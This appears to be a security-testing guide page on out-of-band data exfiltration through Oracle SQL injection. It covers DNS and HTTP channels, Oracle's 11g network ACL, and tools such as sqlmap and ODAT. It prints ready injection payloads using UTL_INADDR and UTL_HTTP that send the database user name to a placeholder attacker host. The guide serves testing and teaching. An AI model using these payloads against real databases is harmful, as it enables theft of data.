---
title: "Out-of-band exfiltration from Oracle injection"
order: 7
description: "Exfiltrating Oracle data over DNS and HTTP with UTL_INADDR, UTL_HTTP, and HTTPURITYPE, and the 11g+ ACL that gates them."
keywords:
  - out of band
  - UTL_HTTP
  - UTL_INADDR
  - HTTPURITYPE
  - DNS exfiltration
  - Oracle ACL
---

# Out-of-band

Oracle is well suited to out-of-band exfiltration because it ships packages that make network requests, so even a fully blind injection can push data to an attacker server, provided the network ACL allows it.

DNS exfiltration builds the value into a hostname that a resolver looks up. `UTL_INADDR.GET_HOST_ADDRESS` performs a forward lookup:

```sql
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.tld') FROM dual) IS NOT NULL-- 
```

The attacker's name server for `attacker.tld` logs `<user>.attacker.tld`. HTTP exfiltration sends the value in a URL, which also carries more data per request:

```sql
' AND UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT user FROM dual)) IS NOT NULL-- 
```

`HTTPURITYPE('http://attacker.tld/'||(SELECT ...)).GETCLOB()` is an alternative HTTP sink, and `DBMS_LDAP` and `UTL_TCP` provide others.

The critical precondition is the Access Control List. From Oracle 11g, `UTL_HTTP`, `UTL_INADDR`, `UTL_TCP`, and `UTL_SMTP` require a fine-grained ACL (managed by `DBMS_NETWORK_ACL_ADMIN`) granting the current user access to the target host, in addition to execute on the package. Without the ACL grant the call raises `ORA-24247: network access denied by access control list`. On 10g there is no ACL and these work with just the execute privilege. Long or non-DNS-safe values are hex-encoded and split across requests. A listener such as Burp Collaborator captures both the DNS and HTTP interactions.

## Tools

- **sqlmap**: automates DNS exfiltration (`--dns-domain`) through the Oracle `UTL` packages.
- **ODAT** (Oracle Database Attacking Tool): exploits `UTL_HTTP` and `UTL_INADDR` out-of-band channels.
- **Burp Collaborator**: captures the DNS and HTTP interactions the payload triggers.

## References

- Oracle Database PL/SQL Packages and Types Reference: UTL_HTTP, UTL_INADDR, DBMS_NETWORK_ACL_ADMIN
- OWASP Testing Guide: Testing for SQL Injection
